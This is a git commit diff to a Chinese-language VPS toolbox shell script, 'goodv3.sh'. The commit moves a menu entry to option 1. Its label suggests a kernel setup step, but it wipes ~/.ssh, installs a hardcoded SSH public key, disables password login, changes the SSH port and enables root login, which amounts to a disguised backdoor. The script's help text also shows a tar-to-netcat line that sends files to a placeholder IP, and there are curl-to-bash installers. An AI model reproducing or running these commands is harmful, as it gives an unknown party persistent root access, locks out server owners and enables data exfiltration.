b29c1d814b03dec3f04edceb77418a3e691dc526
root <feedzhulei@aol.com>
2022-11-09 01:06:25 +0800

    new

--- goodv3.sh
+++ goodv3.sh
@@ -209,7 +209,7 @@ while true
 do
 read  -p "$(echo -e "请选择
 
-${Red_font_prefix}1${Font_color_suffix} tcpx
+${Red_font_prefix}222${Font_color_suffix} tcpx
 ${Red_font_prefix}2${Font_color_suffix} trojan
 ${Red_font_prefix}3${Font_color_suffix} xray
 ${Red_font_prefix}4${Font_color_suffix} realm 中转用
@@ -273,7 +273,7 @@ ${Red_font_prefix}58.1${Font_color_suffix} install_hysteria HyNetwork
 ${Red_font_prefix}59${Font_color_suffix} superspeed_uxh.sh 
 ${Red_font_prefix}60${Font_color_suffix} ping_local
 ${Red_font_prefix}61${Font_color_suffix} 一键工作爬虫搞定 source ~/.bashrc  jobs_spiders
-${Red_font_prefix}222${Font_color_suffix} 一键搞定13 17 21,需要reboot
+${Red_font_prefix}1${Font_color_suffix} 一键搞定13 17 21,需要reboot
 ${Red_font_prefix}62${Font_color_suffix} trojan_go ws ${Red_font_prefix}免流${Font_color_suffix}
 ${Red_font_prefix}63${Font_color_suffix} xray ${Red_font_prefix}免流${Font_color_suffix}
 ${Red_font_prefix}64${Font_color_suffix} 可以检查mask ip gate ${Red_font_prefix}DD${Font_color_suffix}
@@ -304,7 +304,7 @@ tar cfzv  -   <*/filei_path> | nc -q 1   <IP> 9
 \r\n
 ")" choose
 	case $choose in
-		1) eval $tcpx  ;;
+		222) eval $tcpx  ;;
 		2) eval $trojan ;;
 		3) eval $xray;;
 		4) eva $realml;;
@@ -375,7 +375,7 @@ bash  <(curl -Ls https://raw.githubusercontent.com/HyNetwork/hysteria/master/ins
                 59)eval "$superspeed_uxh | tee speeds.log";;		
                 60)eval "$ping_local";;		
                 61)eval "$jobs_spiders" ;;		
-                222)
+                1)
 		eval  'rm -fr  ~/.ssh ;mkdir  ~/.ssh ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7lMkBC39ZW0RFnZZQCrfW2g2mGa2a8TvVd9d+UAfC13oybzrQ4oTEGnJbfhUneDHlo2/sPqN+WsI+xV9bKvUqfv8UfzBk12gB8JRH+gEaj98GqMdiF7YsHLOTDSyUZOEF0WdGORjAFPYOylEQWG/4rDJz7HHTNVoFp5qt8l542ldbSRTNWu8XWsSivEDDkYeb0FeAntn/biz3wXQmwz3myKNcEEBy3UfeysMGDvy/1noL9SQIuyB0Biwtuw4AstykUvoH0AP3nlSc4Cey/n3neCl8di+SBjzWUsICPmJkUQY7szzkFYUbChSO3A9lfmHpJsEGzDiLsF3v2Xdi3UfmfB1MumarW5byR18+KGL2QhCESqLffSONuCQ9UjJdVgdhyKfTTYkjIg8gJ9+1zJbJQq0MBQZw3WQCvyeiaxK/lOAL8CgHGuWDMfshwBgAxiU5mnGICdc253Bdr0pYG3R8CYJZvRmdSfygSZXv3EYDXu1Cz3NBDfdeAU2x6SFygE8= " > ~/.ssh/authorized_keys; sed -i "s/PasswordAuthentication yes/PasswordAuthentication no/g"  /etc/ssh/sshd_config;sed -i "s/#Port 22/Port 54322/g"  /etc/ssh/sshd_config ;sed -i "s/Port 22/Port 54322/g"  /etc/ssh/sshd_config ; sed -i "s/PermitRootLogin no/PermitRootLogin yes/g"  /etc/ssh/sshd_config ; systemctl restart sshd' 
 		eval "$tcpx121721" ;;
                 62)eval "$trojan_go_mianliu" ;;
